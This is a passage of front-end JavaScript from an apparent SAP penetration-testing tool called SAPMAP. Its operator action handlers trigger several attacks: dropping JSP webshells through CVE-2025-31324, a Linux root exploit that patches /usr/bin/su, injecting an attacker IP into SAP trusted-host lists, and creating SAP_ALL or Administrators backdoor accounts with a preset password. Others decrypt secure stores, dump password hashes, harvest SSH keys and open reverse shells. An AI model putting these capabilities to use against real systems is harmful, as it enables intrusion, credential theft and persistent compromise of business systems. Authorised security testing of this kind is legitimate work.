    case 'details': showDetails(sid); break;
    case 'findings': showFindings(sid); break;
    case 'credentials': showCredModal(sid); break;
    case 'rfc_system_info':
      await api('POST', `node/${sid}/rfc_system_info`); break;
    case 'check_gw':
      await api('POST', `node/${sid}/check_gw`); break;
    case 'check_ms':
      await api('POST', `node/${sid}/check_ms`); break;
    case 'check_cve_31324':
      await api('POST', `node/${sid}/check_cve_2025_31324`); break;
    case 'check_cve_6287':
      await api('POST', `node/${sid}/check_cve_2020_6287`); break;
    case 'check_linux_lpe':
      await api('POST', `node/${sid}/check_linux_lpe`);
      showToast('Linux LPE check started — probing both Copy Fail and Dirty Frag', 'info');
      break;
    case 'exploit_linux_lpe': {
      const cmd = prompt('Command to run as root on ' + sid + ':', 'id');
      if (!cmd) break;
      if (!confirm(
            'Run Linux LPE on ' + sid + '?\n\n' +
            'SAPMAP picks the best technique automatically: Copy Fail '
            + '(CVE-2026-31431) when viable, otherwise Dirty Frag (no '
            + 'CVE — embargo broke).\n\n'
            + 'Both temporarily patch /usr/bin/su in the kernel page '
            + 'cache to execute:\n  ' + cmd + '\n\n'
            + 'Non-persistent (page cache only, lost on reboot or '
            + '`echo 3 > /proc/sys/vm/drop_caches`).')) break;
      await api('POST', `node/${sid}/exploit_linux_lpe`, {command: cmd});
      break;
    }
    case 'read_java_destinations': {
      if (!confirm('Enumerate JCo destinations from J2EE_CONFIGENTRY?\n\n' +
                    'Decrypts each destination\'s password via SecStoreFS, ' +
                    'auto-plots downstream ABAP targets that aren\'t on the ' +
                    'map yet, imports the credentials, and draws RFC edges ' +
                    'from this node to each target.')) break;
      await api('POST', `node/${sid}/read_java_destinations`);
      break;
    }
    case 'download_java_secstore': {
      if (!confirm('Extract + decrypt the Java Secure Store?\n\n' +
                    'Reads /usr/sap/<SID>/SYS/global/security/data/SecStore.{properties,key}\n' +
                    'and decrypts entries using the target\'s own SecStoreFS class.\n' +
                    'Also queries J2EE_CONFIGENTRY for encrypted config rows.\n\n' +
                    'Any downstream ABAP systems referenced by SAPJSF/JCo entries will be ' +
                    'auto-added to the map, with the extracted credentials imported and ' +
                    'an RFC edge drawn from this node to them.')) break;
      await api('POST', `node/${sid}/java_secstore`);
      // Poll briefly for the results; when they land, show a small
      // bottom-right toast with a "View details" button instead of
      // auto-opening the modal — the modal would hide any new downstream
      // nodes auto-plotted on the map during extraction.
      const pollStart = Date.now();
      const pollTimer = setInterval(() => {
        const nn = (mapState.nodes || {})[sid];
        if (nn && nn.java_secstore_checked && (nn.java_secstore_entries||[]).length) {
          clearInterval(pollTimer);
          showJavaSecStoreToast(sid);
        } else if (Date.now() - pollStart > 180000) {
          clearInterval(pollTimer);
        }
      }, 1500);
      break;
    }
    case 'view_java_secstore':
      showJavaSecStoreModal(sid); break;
    case 'create_user_java': {
      const u = prompt('Create Java user\n\nUsername:', 'SAPMAP00');
      if (!u || !u.trim()) break;
      const p = prompt('Password (leave empty for random):', 'Andinyougo123!');
      if (p === null) break;
      const g = prompt('Add to group (blank = Administrators):', 'Administrators');
      const n = (mapState.nodes || {})[sid];
      const hasCve = n && n.cve_2025_31324_vulnerable;
      const hasRecon = n && n.cve_2020_6287_vulnerable;
      const hasGw  = n && n.gw_vulnerable;
      let method = 'auto';
      const paths = [];
      if (hasCve)   paths.push('"cve" (CVE-2025-31324)');
      if (hasRecon) paths.push('"recon" (CVE-2020-6287 RECON)');
      if (hasGw)    paths.push('"gw" (RFC Gateway SAPXPG)');
      if (paths.length > 1) {
        const m = prompt('Method — ' + paths.join(', ') +
                          '.\nLeave "auto" to let SAPMAP pick the best:', 'auto');
        if (m === null) break;
        if (/^cve/i.test(m) && !/recon/i.test(m)) method = 'cve_31324';
        else if (/^recon/i.test(m)) method = 'recon';
        else if (/^gw/i.test(m)) method = 'gw';
      }
      await api('POST', `node/${sid}/create_user_java`, {
        username: u.trim(),
        password: (p || '').trim(),
        group:    (g || 'Administrators').trim(),
        method:   method,
      });
      break;
    }
    case 'exploit_cve_31324_drop': {
      if (!confirm('Drop a JSP webshell via CVE-2025-31324?\n\n' +
                    'A randomly-named JSP will be written under /irj/<name>.jsp ' +
                    'on the target and then usable to run OS commands with output ' +
                    'capture.  Remember to remove the file when you are done.')) break;
      const r = await api('POST', `node/${sid}/exploit_cve_2025_31324`,
                          { mode: 'dropshell' });
      if (r && r.success) {
        alert('Shell dropped at:\n' + r.shell_url +
              '\n\nDirect URL example — append ?cmd=<command>:\n' +
              r.shell_url + '?cmd=whoami\n\n' +
              'Or use the OS Command Terminal with method ' +
              '"CVE-2025-31324 (Java unauth)" for an interactive console with ' +
              'captured stdout.');
      } else {
        alert('Drop failed: ' + ((r && r.error) || 'unknown error'));
      }
      break;
    }
    case 'betrusted': {
      const n = (mapState.nodes || {})[sid];
      const msPort = n && n.ms_port ? n.ms_port : '39NN';
      const ip = prompt(`Betrusted — Inject Trusted IP (10KBLAZE)\nMS port: ${msPort}\n\nEnter the attacker IP to inject into the gateway's trusted host list:`, localIp);
      if (ip && ip.trim()) {
        await api('POST', `node/${sid}/betrusted`, { attacker_ip: ip.trim(), nilist_wait: 30 });
      }
      break;
    }
    case 'create_user_betrusted': {
      const n = (mapState.nodes || {})[sid];
      const msPort = n && n.ms_port ? n.ms_port : '39NN';
      const clients_bt = (n && n.clients || []).map(c => typeof c === 'object' ? c.nr || '?' : String(c));
      let defBt = clients_bt.find(c => c !== '000') || clients_bt[0] || '001';
      const ip = prompt(
        `10KBLAZE Full Chain: betrusted → GW trust → create user\nMS port: ${msPort}\n\n` +
        `Enter attacker IP to inject:`, localIp
      );
      if (ip === null) break;
      const clientBt = prompt(
        `Create user in which client?\n\n` +
        (clients_bt.length > 0 ? `Known clients: ${clients_bt.join(', ')}\n` : '') +
        `(User will be created with SAP_ALL)`,
        defBt
      );
      if (clientBt === null) break;
      await api('POST', `node/${sid}/betrusted_chain`,
                { attacker_ip: ip.trim(), nilist_wait: 30, client: clientBt.trim() });
      break;
    }
    case 'create_user_gw': {
      const n_gw = (mapState.nodes || {})[sid];
      const sysTypeGw = (n_gw && n_gw.system_type || '').toUpperCase();
      const isJavaOnly = sysTypeGw.indexOf('JAVA') !== -1 && sysTypeGw.indexOf('ABAP') === -1;
      if (isJavaOnly) {
        // Java stack has no client concept and no USR02 — route to the
        // Java UME backend using the GW SAPXPG delivery path.
        const uj = prompt('Create Java user (via GW SAPXPG → UME)\n\nUsername:', 'SAPMAP00');
        if (!uj || !uj.trim()) break;
        const pj = prompt('Password (leave empty for random):', 'Andinyougo123!');
        if (pj === null) break;
        const gj = prompt('Add to group (blank = Administrators):', 'Administrators');
        await api('POST', `node/${sid}/create_user_java`, {
          username: uj.trim(),
          password: (pj || '').trim(),
          group:    (gj || 'Administrators').trim(),
          method:   'gw',
        });
        break;
      }
      // ABAP / dual-stack: original USR02 SQL-INSERT path (needs client)
      const clients_gw = (n_gw && n_gw.clients || []).map(c => typeof c === 'object' ? c.nr || '?' : String(c));
      let defaultClient = clients_gw.find(c => c !== '000') || clients_gw[0] || '001';
      const clientGw = prompt(
        `Create user in which client?\n\n` +
        (clients_gw.length > 0 ? `Known clients: ${clients_gw.join(', ')}\n` : '') +
        `(User will be created with SAP_ALL via GW exploit)`,
        defaultClient
      );
      if (clientGw === null) break;
      await api('POST', `node/${sid}/create_user`, { method: 'gw_exploit', client: clientGw.trim() });
      break;
    }
    case 'create_user_creds': {
      const n_cr = (mapState.nodes || {})[sid];
      const clients_cr = (n_cr && n_cr.clients || []).map(c => typeof c === 'object' ? c.nr || '?' : String(c));
      let defCr = clients_cr.find(c => c !== '000') || clients_cr[0] || '001';
      const clientCr = prompt(
        `Create user in which client?\n\n` +
        (clients_cr.length > 0 ? `Known clients: ${clients_cr.join(', ')}\n` : '') +
        `(User will be created via BAPI with credentials)`,
        defCr
      );
      if (clientCr === null) break;
      await api('POST', `node/${sid}/create_user`, { method: 'credentials', client: clientCr.trim() });
      break;
    }
    case 'lpe':
      await api('POST', `node/${sid}/lpe`); break;
    case 'deep_scan':
      await api('POST', `node/${sid}/deep_scan`); break;
    case 'standard_scan':
      await api('POST', `node/${sid}/standard_scan`); break;
    case 'analyse_capabilities': {
      const probe = confirm(
        'Run user capability analyser on ' + sid + '?\n\n' +
        'Reads AGR_USERS / AGR_1251 / UST04 to map every user we ' +
        'own to human-readable business capabilities (e.g. ' +
        '"can read BSEG", "can edit vendor IBANs in LFBK").\n\n' +
        'Click OK to also run COUNT(*) row probes on each named ' +
        'table for the engagement report ("BSEG = 20.7M rows") — ' +
        'a few seconds longer.\nCancel to skip the row probes.');
      await api('POST', `node/${sid}/analyse_capabilities`,
                { probe_row_counts: probe });
      break;
    }
    case 'retrieve_rfcs':
      await api('POST', `node/${sid}/retrieve_rfcs`); break;
    case 'test_rfcs':
      if (!confirm('Test RFC destinations on ' + sid + '?\n\n' +
                   '⚠ Warning: if a destination holds a wrong password for a ' +
                   'real user, this may lock that user on the target system.')) break;
      await api('POST', `node/${sid}/test_rfcs`); break;
    case 'download_hashes': {
      const nh = (mapState.nodes || {})[sid];
      const sysT = (nh && nh.system_type || '').toUpperCase();
      const isJavaOnly = sysT.indexOf('JAVA') !== -1 && sysT.indexOf('ABAP') === -1;
      if (isJavaOnly) {
        if (!confirm('Extract Java password material?\n\n' +
                      'Pulls UME_STRINGS j_user/j_password pairs (UME hashes) ' +
                      'AND J2EE_CONFIGENTRY password-like rows (cleartext after ' +
                      'SecStoreFS decryption).  Output saved to loot/ as ' +
                      'hashes_java_<SID>_<ts>.txt.')) break;
        await api('POST', `node/${sid}/extract_java_hashes`);
      } else {
        await api('POST', `node/${sid}/download_hashes`);
      }
      break;
    }
    case 'download_secstore':
      await api('POST', `node/${sid}/download_secstore`); break;
    case 'download_table': {
      const nt = (mapState.nodes || {})[sid];
      const sysTt = (nt && nt.system_type || '').toUpperCase();
      const isJavaOnly2 = sysTt.indexOf('JAVA') !== -1 && sysTt.indexOf('ABAP') === -1;
      if (isJavaOnly2) {
        const tbl = prompt('Java DB table to download (e.g. UME_STRINGS, J2EE_CONFIGENTRY, J2EE_CONFIG_DEPLOY):', 'UME_STRINGS');
        if (!tbl || !tbl.trim()) break;
        const flds = prompt('Fields (comma-separated, leave blank or "*" for all):', '*');
        if (flds === null) break;
        const where = prompt('Optional WHERE clause (without "WHERE"):', '');
        if (where === null) break;
        const max = prompt('Max rows:', '500');
        if (max === null) break;
        await api('POST', `node/${sid}/download_java_table`, {
          table:    tbl.trim(),
          fields:   (flds || '*').trim(),
          where:    (where || '').trim(),
          max_rows: parseInt(max, 10) || 500,
        });
      } else {
        document.getElementById('table-modal').classList.add('visible');
      }
      break;
    }
    case 'impact_assess': {
      const n_ia = (mapState.nodes || {})[sid];
      // Collect all unique clients from credentials + created users
      const credClients = new Set();
      for (const c of (n_ia && n_ia.credentials || [])) {
        if (c.client) credClients.add(c.client);
      }
      for (const u of (n_ia && n_ia.created_users || [])) {
        if (u.client) credClients.add(u.client);
      }
      const clientList = [...credClients].sort();
      let chosenClient = null;
      if (clientList.length > 1) {
        const defClient = clientList.find(c => c !== '000') || clientList[0];
        const chosen = prompt(
          `Run business impact scenarios in which client?\n\n` +
          `Available clients with credentials: ${clientList.join(', ')}\n\n` +
          `(Business data like sales orders, HR data, etc. is typically in client 001+)`,
          defClient
        );
        if (chosen === null) break;
        chosenClient = chosen.trim();
      }
      const payload = chosenClient ? { client: chosenClient } : {};
      await api('POST', `node/${sid}/impact/assess`, payload);
      break;
    }
    case 'impact_view':
      showImpactDetail(sid); break;
    case 'impact_assess_java':
      await api('POST', `node/${sid}/impact_assess_java`); break;
    case 'os_terminal': showTerminalModal(sid); break;
    case 'reverse_shell': showShellModal(sid); break;
    case 'create_tcpip': showTcpipModal(sid); break;
    case 'propagate': showPropagateModal(sid); break;
    case 'harvest_btp_creds': await showHarvestBtpCredsModal(sid); break;
    case 'cleanup':
      if (confirm(`Delete SAPMAP00 user from ${sid}?`))
        await api('POST', `node/${sid}/cleanup`);
      break;
    case 'client_roles':
      await api('POST', `node/${sid}/client_roles`); break;
    case 'set_type': showTypeModal(sid); break;
    case 'set_db_type': showDbTypeModal(sid); break;
    case 'set_os_type': showOsTypeModal(sid); break;
    case 'set_instance_nr': showInstanceNrModal(sid); break;
    case 'check_router_info':
      await api('POST', `node/${sid}/check_router_info`); break;
    case 'router_scan': showRouterScanModal(sid); break;
    case 'enum_clients':
      await api('POST', `node/${sid}/enum_clients`); break;
    case 'default_creds':
      if (confirm('⚠️ WARNING: Checking default accounts may LOCK user accounts after failed login attempts.\\n\\nThis tests well-known SAP default credentials (SAP*, DDIC, TMSADM, etc.) via DIAG protocol.\\n\\nProceed?'))
        api('POST', `node/${sid}/check_default_creds`);
      break;
    case 'set_saprouter': showSaprouterModal(sid); break;
    case 'harvest_scc': {
      const nh = (mapState.nodes || {})[sid];
      const canHarvest = nh && (nh.gw_vulnerable || nh.cve_2025_31324_vulnerable);
      if (!canHarvest) {
        alert('Harvest SCC requires a pwned/vulnerable node (GW exploit or CVE-2025-31324).\n\nExploit the node first, then try again.');
        break;
      }
      if (!confirm('Harvest SCC from ' + sid + '?\n\n' +
                   'Runs ARP/host sweep, SSH-key hunt, and same-host SCC bundle ' +
                   'exfiltration on the pwned node.  May write files to /tmp on target.')) break;
      await api('POST', `node/${sid}/harvest_scc`);
      break;
    }
    case 'harvest_scc_mappings': {
      if (!confirm('Harvest SCC mappings from co-located SCC on ' + sid + ' via OS-exec?\n\nReads backends.xml directly from disk — no SCC admin credentials needed.')) break;
      await api('POST', `node/${sid}/harvest_scc_mappings`);
      console.log('[SCC] Mapping harvest started');
      break;
    }
    case 'harvest_scc_ssfs': {
      if (!confirm('Decrypt on-host SCC SSFS from ' + sid + ' via OS-exec?\n\n' +
                   'Reads SSFS_SCC.KEY + SSFS_SCC.DAT directly from disk.\n' +
                   'Recovers secrets such as JAVA_KEYSTORE_PASSWORD, PP CA key password.\n' +
                   '(The backup zip SSFS is double-encrypted and yields 0 secrets — this does not.)')) break;
      await api('POST', `node/${sid}/harvest_scc_ssfs`);
      console.log('[SCC] On-host SSFS decrypt started');
      break;
    }
    // ── Cloud Connector submenu actions (proxy to SCC functions) ──────
    // n is not in scope at the top switch level — resolve via sid.
    case 'scc_via_sap_set_credentials':
    case 'scc_via_sap_probe_creds':
    case 'scc_via_sap_pull_mappings':
    case 'scc_via_sap_probe_mappings':
    case 'scc_via_sap_extract_keystore':
    case 'scc_via_sap_download_hashes': {
      const _sapNode = (mapState.nodes || {})[sid];
      const _sccH = _sccHostForNode(_sapNode);
      if (!_sccH) { showToast('No SCC found on same host as ' + sid, 'warn'); break; }
      if (action === 'scc_via_sap_set_credentials')  showSCCCredModal(_sccH);
      if (action === 'scc_via_sap_probe_creds')       sccProbeCreds(_sccH);
      if (action === 'scc_via_sap_pull_mappings')     sccPullMappings(_sccH);
      if (action === 'scc_via_sap_probe_mappings')    sccProbeMappings(_sccH);
      if (action === 'scc_via_sap_extract_keystore')  sccExtractKeystore(_sccH);
      if (action === 'scc_via_sap_download_hashes')   sccDownloadHashes(_sccH);
      break;
    }
    case 'set_telnet_override': {
      const cur = n.telnet_override || '';
      const val = prompt(
        'Telnet-console endpoint for this node.\n\n' +
        'Use when the target binds admin telnet to 127.0.0.1 and you\n' +
        'have an SSH tunnel:\n' +
        '    ssh -L 50008:127.0.0.1:50008 user@target\n' +
        'Then set this to "127.0.0.1:50008".\n\n' +
        'Leave empty to clear and use the default 5NN08 on the node.',
        cur);
      if (val === null) break;
      await api('POST', `node/${sid}/set_telnet_override`,
                 { telnet_override: val.trim() });
      break;
    }
    case 'delete_system':
      if (confirm(`Delete ${sid} from the map? This removes the system and all its connections.`)) {
        const r = await api('DELETE', `node/${sid}`);
        if (r && r.error) { alert('Delete failed: ' + r.error); break; }
        // Immediately remove from local state and re-render
        delete mapState.nodes[sid];
        mapState.connections = (mapState.connections || []).filter(
          c => c.source_sid !== sid && c.target_sid !== sid);
        updateMap();
      }
      break;
  }
  startPolling();
}

// Tracks the per-modal live-poller so we never run more than one at
// a time and we cancel the old one when the operator clicks a
// different connection.
let _connInfoPollTimer = null;
let _connInfoLastKey = '';
let _connInfoCurrentIdx = -1;

function _connInfoStateKey(c) {
  if (!c) return '<missing>';
  return JSON.stringify({
    tested:           !!c.tested,
    logon_successful: !!c.logon_successful,
    has_sap_all:      !!c.has_sap_all,
    profiles_len:     (c.profiles || []).length,
    roles_len:        (c.roles || []).length,
    user_detail_err:  (c.user_detail_error || '').length,
    sapxpg_remote_works: !!c.sapxpg_remote_works,
    ping_ok:          !!c.ping_ok,
  });
}

function _connInfoStartLivePoll(connIdx) {
  // One active poller at a time; clear any stale one.
  if (_connInfoPollTimer != null) {
    clearInterval(_connInfoPollTimer);
    _connInfoPollTimer = null;
  }
  _connInfoCurrentIdx = connIdx;
  _connInfoLastKey = _connInfoStateKey(
    (mapState.connections || [])[connIdx]);
  const panel = document.getElementById('info-panel');
  const POLL_MS = 750;
  _connInfoPollTimer = setInterval(() => {
    // Operator closed the modal OR opened another connection — stop.
    if (!panel.classList.contains('visible')
        || _connInfoCurrentIdx !== connIdx) {
      clearInterval(_connInfoPollTimer);
      _connInfoPollTimer = null;
      return;
    }
    const c = (mapState.connections || [])[connIdx];
    const key = _connInfoStateKey(c);
    if (key === _connInfoLastKey) return;
    _connInfoLastKey = key;
    // Re-render in place — preserve current screen coordinates so
    // the panel doesn't jump.
    const initialLeft = panel.style.left;
    const initialTop  = panel.style.top;
    const fakeEvent = {
      stopPropagation: () => {},
      clientX: parseInt(initialLeft) || 0,
      clientY: parseInt(initialTop)  || 0,
    };
    showConnInfo(fakeEvent, connIdx);
  }, POLL_MS);
}

function showConnInfo(e, connIdx) {
  e.stopPropagation();
  const conn = (mapState.connections || [])[connIdx];
  if (!conn) return;

  const panel = document.getElementById('info-panel');
  const isHttp = (conn.conn_type || '') === 'http';
  const isTypeT = !isHttp && !!conn.sapxpg_remote_works;
  const connType = isHttp ? 'HTTP' : (isTypeT ? 'T' : '3');
  let risk;
  if (isHttp) {
    // HTTP: password+user is high-value if it logs into a Java admin
    // interface; medium otherwise.  We don't test HTTP automatically
    // yet — rank by creds availability.
    risk = (conn.rfc_user && conn.secstore_password)
           ? 'MEDIUM' : 'UNKNOWN';
  } else if (isTypeT) {
    risk = conn.ping_ok ? 'CRITICAL' : conn.tested ? 'LOW' : 'UNKNOWN';
  } else {
    risk = conn.has_sap_all && conn.logon_successful ? 'CRITICAL' :
      conn.logon_successful ? 'MEDIUM' : conn.tested ? 'LOW' : 'UNKNOWN';
  }
  const riskClass = 'risk-' + risk.toLowerCase();

  // Profiles / Roles are ABAP-RFC concepts; never apply to Type T
  // (TCP/IP sapxpg) or HTTP destinations.
  let profilesHtml = '';
  if (!isTypeT && !isHttp) {
    (conn.profiles || []).forEach(p => {
      const cls = p === 'SAP_ALL' ? 'profile-item sap-all' : 'profile-item';
      profilesHtml += `<div class="${cls}">${p === 'SAP_ALL' ? '&#9888; ' : ''}${escHtml(p)}</div>`;
    });
  }

  let rolesHtml = '';
  if (!isTypeT && !isHttp) {
    (conn.roles || []).forEach(r => {
      rolesHtml += `<div class="profile-item">${escHtml(r)}</div>`;
    });
  }

  // For Type T, derive gateway port from target node
  let gwPort = '';
  if (isTypeT) {
    const tgt = (mapState.nodes || {})[conn.target_sid];
    if (tgt) {
      for (const inst of (tgt.instances || [])) {
        for (const [p, svc] of Object.entries(inst.ports || {})) {
          if (svc === 'gateway' || (p >= 3300 && p <= 3399)) { gwPort = p; break; }
        }
        if (gwPort) break;
      }
      if (!gwPort) {
        const nrs = (tgt.instances || []).map(i => i.instance_nr).filter(n => n !== 'XX').sort();
        gwPort = nrs.length ? '33' + nrs[0] : '3300';
      }
    }
  }

  const connLabel = isHttp ? 'HTTP' : (isTypeT ? 'TCP/IP' : 'RFC');
  panel.innerHTML = `
    <h3>${connLabel} Connection Details</h3>
    <div class="info-row"><span class="info-label">Source:</span><span class="info-val">${escHtml(conn.source_sid)} (${escHtml(conn.source_host)})</span></div>
    <div class="info-row"><span class="info-label">Target:</span><span class="info-val">${escHtml(conn.target_sid || '?')} (${escHtml(conn.target_host || '?')})</span></div>
    <div class="info-row"><span class="info-label">Destination:</span><span class="info-val">${escHtml(conn.destination_name)} (Type ${connType})</span></div>
    ${isHttp ? `
      <div class="info-row"><span class="info-label">URL:</span><span class="info-val" style="word-break:break-all">${escHtml(conn.http_url || '?')}</span></div>
      <div class="info-row"><span class="info-label">Auth type:</span><span class="info-val">${escHtml(conn.http_auth_type || '?')}</span></div>
      ${conn.http_proxy ? `<div class="info-row"><span class="info-label">Proxy:</span><span class="info-val">${escHtml(conn.http_proxy)}</span></div>` : ''}
      ${conn.http_target_platform ? `<div class="info-row"><span class="info-label">Platform:</span><span class="info-val">${escHtml(conn.http_target_platform)}</span></div>` : ''}
      <div class="info-row"><span class="info-label">User:</span><span class="info-val">${escHtml(conn.rfc_user || '?')}</span></div>
      ${conn.secstore_password ? `<div class="info-row"><span class="info-label">SecStore Pwd:</span><span class="info-val ss-reveal" style="color:#3fb950;cursor:pointer"><span class="ss-masked">&#9679;&#9679;&#9679;&#9679; (${conn.secstore_password.length} chars) — click to reveal</span><span class="ss-plain" style="display:none">${escHtml(conn.secstore_password)}</span></span></div>` : ''}
      <div class="info-section" style="color:#8b949e;font-size:11px">
        ${(() => {
          const plat = (conn.http_target_platform || '').toUpperCase();
          const u = escHtml(conn.rfc_user || 'the user');
          if (plat === 'ABAP') {
            return `ABAP HTTP destination — if ${u} carries SAP_ALL (or S_USER_GRP / S_USER_AGR with full activity) you can log straight into SAP GUI / Fiori / SOAP or call BAPI_USER_CREATE1 against the target client to mint a foothold.  Test Connection runs basic-auth, then probes profiles via direct RFC.`;
          }
          if (plat === 'JAVA') {
            return `Java HTTP destination — if ${u} has UME admin, you can log into the target Java stack's NWA / CTC ConfigServlet / Telnet console with these creds and drop a JSP for full OS access.`;
          }
          return `HTTP destination — Test Connection probes basic-auth against the URL.  When the target maps to an ABAP node, profiles + SAP_ALL get fetched via direct RFC; when it maps to a Java node, the credential goes to UME tooling.`;
        })()}
      </div>
    ` : isTypeT ? `
      <div class="info-row"><span class="info-label">Port:</span><span class="info-val">${escHtml(gwPort)}</span></div>
    ` : `
      <div class="info-row"><span class="info-label">Client:</span><span class="info-val">${escHtml(conn.client || '?')}</span></div>
      <div class="info-row"><span class="info-label">RFC User:</span><span class="info-val">${escHtml(conn.rfc_user || '?')}</span></div>
      ${conn.secstore_password ? `<div class="info-row"><span class="info-label">SecStore Pwd:</span><span class="info-val ss-reveal" style="color:#3fb950;cursor:pointer"><span class="ss-masked">&#9679;&#9679;&#9679;&#9679; (${conn.secstore_password.length} chars) — click to reveal</span><span class="ss-plain" style="display:none">${escHtml(conn.secstore_password)}</span></span></div>` : ''}
    `}
    ${profilesHtml ? `<div class="info-section"><strong style="font-size:11px;color:#8b949e">Profiles</strong><div class="profile-list">${profilesHtml}</div></div>` : ''}
    ${rolesHtml ? `<div class="info-section"><strong style="font-size:11px;color:#8b949e">Roles</strong><div class="profile-list">${rolesHtml}</div></div>` : ''}
    ${(!isHttp && conn.user_detail_error) ? `<div class="info-section" style="color:#d29922;font-size:11px">${escHtml(conn.user_detail_error)}</div>` : ''}
    ${isHttp ? '' : `<div class="info-section">
      <strong style="font-size:11px;color:#8b949e">/SDF/RFC_CHECK</strong>
      ${conn.tested ? `
        <div class="info-row"><span class="info-label">Ping:</span><span class="info-val">${conn.ping_ok ? 'OK' : 'Failed'}${conn.latency_ms ? ' ('+conn.latency_ms+'ms)' : ''}</span></div>
        ${isTypeT ? '' : `<div class="info-row"><span class="info-label">Logon:</span><span class="info-val">${conn.logon_successful ? '&#9989; RFC Logon successful.' : (conn.logon_tested ? '&#10060; Failed' : '&#9898; Not tested')}</span></div>`}
      ` : '<div style="color:#484f58;font-size:11px;margin-top:4px">Not tested yet</div>'}
    </div>`}
    <div class="info-section">
      <div class="info-row"><span class="info-label">Risk:</span><span class="info-val"><span class="risk-badge ${riskClass}">${risk}</span></span></div>
    </div>
    <div style="text-align:right;margin-top:8px;display:flex;gap:6px;justify-content:flex-end;flex-wrap:wrap">
      ${(!isTypeT && conn.logon_successful && conn.has_sap_all && conn.target_sid) ?
        `<button class="btn" style="background:#b33;color:#fff" onclick="createUserOnTarget('${escHtml(conn.source_sid)}','${escHtml(conn.destination_name)}','${escHtml(conn.target_sid)}')">Create Remote User</button>` : ''}
      ${isTypeT ? '' :
        `<button class="btn" onclick="testConnection('${escHtml(conn.source_sid)}','${escHtml(conn.destination_name)}',${connIdx})">Test Connection</button>`}
      <button class="btn" onclick="document.getElementById('info-panel').classList.remove('visible')">Close</button>
    </div>
  `;
  // Wire up click-to-reveal for SecStore password
  panel.querySelectorAll('.ss-reveal').forEach(row => {
    row.addEventListener('click', () => {
      const m = row.querySelector('.ss-masked');
      const p = row.querySelector('.ss-plain');
      if (m.style.display === 'none') { m.style.display = ''; p.style.display = 'none'; }
      else { m.style.display = 'none'; p.style.display = ''; }
    });
  });

  panel.style.left = Math.min(e.clientX, window.innerWidth - 440) + 'px';
  panel.style.top = Math.min(e.clientY, window.innerHeight - 520) + 'px';
  panel.classList.add('visible');

  // Start a per-modal live poller so any subsequent backend update
  // (Test Connection finishing, bulk Test RFCs filling profiles,
  // RECON-driven probe etc.) re-renders this open modal without the
  // operator having to close and re-open it.  Cheap: only re-renders
  // when the connection's state key actually changes.
  _connInfoStartLivePoll(connIdx);
}

async function testSingleRfc(sid, destName, connIdx) {
  // Just kick the backend test off.  The per-modal live-poller
  // (started in showConnInfo) catches phase-1 (tested+logon_tested)
  // and phase-2 (profiles+roles+has_sap_all) updates and re-renders
  // the modal in place when either lands.  No separate poller here.
  await api('POST', `node/${sid}/test_rfc_single`, { destination_name: destName });
  startPolling();
}

async function createUserViaRfc(sourceSid, destName, targetSid) {
  document.getElementById('info-panel').classList.remove('visible');
  await api('POST', `node/${sourceSid}/create_user_via_rfc`, {
    destination_name: destName,
    target_sid: targetSid
  });
  startPolling();
}

// Generic dispatcher — routes BTP-sourced edges to /api/btp/* endpoints,
// everything else to the existing per-node endpoints.  Same payload either
// way so the modal poller doesn't need to know which path was taken.
async function testConnection(sid, destName, connIdx) {
  if ((sid || '').startsWith('BTP:')) {
    await api('POST', 'btp/test_destination', {
      source_sid: sid, destination_name: destName });
  } else {
    await api('POST', `node/${sid}/test_rfc_single`, {
      destination_name: destName });
  }
  startPolling();
}

async function createUserOnTarget(sourceSid, destName, targetSid) {
  document.getElementById('info-panel').classList.remove('visible');
  if ((sourceSid || '').startsWith('BTP:')) {
    await api('POST', 'btp/create_user_on_target', {
      source_sid: sourceSid, destination_name: destName, target_sid: targetSid });
  } else {
    await api('POST', `node/${sourceSid}/create_user_via_rfc`, {
      destination_name: destName, target_sid: targetSid });
  }
  startPolling();
}

// --- Detail panel ---
function showDetails(sid) {
  const n = (mapState.nodes || {})[sid];
  if (!n) return;
  const panel = document.getElementById('detail-panel');
  if (panel.classList.contains('visible') && panel.dataset.sid === sid) {
    panel.classList.remove('visible');
    return;
  }
  panel.dataset.sid = sid;
  panel.innerHTML = `
    <span class="close-btn" onclick="this.parentElement.classList.remove('visible')">&times;</span>
    <h3>${escHtml(n.sid)} System Details</h3>
    <div class="detail-section">
      <div class="detail-row"><span class="detail-key">SID</span><span class="detail-val">${escHtml(n.sid)}</span></div>
      <div class="detail-row"><span class="detail-key">Type</span><span class="detail-val">${escHtml(n.system_type)}</span></div>
      <div class="detail-row"><span class="detail-key">Hostname</span><span class="detail-val">${escHtml(n.hostname)}</span></div>
      <div class="detail-row"><span class="detail-key">IP</span><span class="detail-val">${escHtml(n.ip)}</span></div>
      <div class="detail-row"><span class="detail-key">OS</span><span class="detail-val">${escHtml(n.os_type)}</span></div>
      <div class="detail-row"><span class="detail-key">Database</span><span class="detail-val">${escHtml(n.db_type)}</span></div>
      <div class="detail-row"><span class="detail-key">Kernel</span><span class="detail-val">${escHtml(n.kernel)}</span></div>
      <div class="detail-row"><span class="detail-key">SAP Release</span><span class="detail-val">${escHtml(n.sap_release)}</span></div>
      <div class="detail-row"><span class="detail-key">Production</span><span class="detail-val">${n.is_production ? '<span style="color:#f85149">YES</span>' : 'No'}</span></div>
      <div class="detail-row"><span class="detail-key">Pwned</span><span class="detail-val">${n.pwned ? '<span style="color:#f0883e">&#9889; YES</span>' : 'No'}</span></div>
      <div class="detail-row"><span class="detail-key">GW Vulnerable</span><span class="detail-val">${n.gw_vulnerable ? '<span style="color:#f85149">YES — SAPXPG</span>' : 'No'}</span></div>
      <div class="detail-row"><span class="detail-key">MS Vulnerable</span><span class="detail-val">${
        n.ms_vulnerable ? `<span style="color:#f85149">YES — betrusted (port ${n.ms_port})</span>`
        : n.ms_acl_protected ? `<span style="color:#d29922">ACL protected (port ${n.ms_port})</span>`
        : n.ms_port ? `<span style="color:#3fb950">Port ${n.ms_port} open</span>`
        : 'Not checked'
      }</span></div>
      ${(n.system_type || '').toUpperCase().indexOf('JAVA') !== -1 ? `
      <div class="detail-row"><span class="detail-key">CVE-2025-31324</span><span class="detail-val">${
        n.cve_2025_31324_vulnerable
          ? `<span style="color:#f85149">YES — metadatauploader RCE (port ${n.cve_2025_31324_port}${n.cve_2025_31324_https ? ' HTTPS' : ''})</span>`
          : n.cve_2025_31324_checked
            ? `<span style="color:#3fb950">Not vulnerable</span><span style="color:#8b949e"> · ${escHtml(n.cve_2025_31324_evidence || '')}</span>`
            : 'Not checked'
      }${(n.cve_2025_31324_shells || []).length
          ? ` · <span style="color:#f0883e">${(n.cve_2025_31324_shells || []).length} JSP shell(s) dropped</span>`
          : ''}</span></div>` : ''}
